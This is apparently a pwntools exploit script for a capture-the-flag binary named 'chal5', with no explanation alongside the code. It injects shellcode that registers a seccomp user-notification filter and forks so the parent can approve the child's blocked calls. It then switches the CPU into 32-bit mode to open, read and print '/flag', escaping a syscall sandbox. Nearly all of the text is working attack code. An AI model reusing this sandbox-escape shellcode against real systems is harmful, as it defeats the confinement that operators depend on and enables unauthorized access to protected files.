from pwn import *

p = process("./chal5")
context.arch = 'amd64'
shellcode = f'''
    mov esp,0xcafe800
    mov ax,0x13d
    mov sil,0x8
    mov rbx,0x7fff000000000006
    push rbx
    mov rbx,0x7fc0000000000006
    push rbx
    mov rbx,0xc000003e00010015
    push rbx
    mov rbx, 0x400000020
    push rbx
    mov rbx,rsp
    push rbx
    xor rbx,rbx
    mov bl,0x4
    push rbx
    mov rdx,rsp
    syscall

    mov r8,rax

    mov al,0x39
    syscall
    cmp rax,0

    je child_process
parent_process:
    xor rax,rax
clean_req_and_resp:
    mov ecx, 0xd
    mov rdx,0xcafec00
loop:
    mov qword ptr [rdx],rax
    dec rcx
    add dl,0x8
    cmp rcx,0
    jne loop
recv:
    mov rax,0x10
    mov rdi,r8
    mov rsi,0xc0502100
    mov rdx,0xcafec00
    syscall
copy_id_of_resp:
    mov rax, 0xcafec00
    mov rbx, qword ptr[rax]
    add al,0x50
    mov qword ptr[rax], rbx
set_flags_of_resp:
    add al,0x14
    mov rbx,1
    mov dword ptr[rax], ebx
resp:
    xor rax,rax
    mov al,0x10
    mov rdi,r8
    mov esi,0xC0182101
    mov edx,0xcafec50
    syscall
    jmp parent_process
child_process:
    dec rcx
    cmp rcx,0
    jne child_process
show_flag:
    mov rax,0x230cafe0d4
    push rax
    retf 
'''
X32_showflag ='''
    xor eax,eax
    mov al, 0x5
    mov ebx,0xcafe0f8
    xor ecx,ecx
    xor edx,edx
    int 0x80
    mov ebx,eax
    mov al, 3
    mov ecx,esp
    mov cl,0x00
    mov dl,0xff
    int 0x80
    mov al,4
    mov ebx, 1
    int 0x80
'''
# gdb.attach(p,'''
# b *0xcafe0d3
# ''')

shellcode = asm(shellcode)
context.arch = 'i386'
context.bits = 32
shellcode = shellcode + asm(X32_showflag)

p.send((shellcode+b"/flag\0").ljust(0x100,b'\0'))
p.interactive()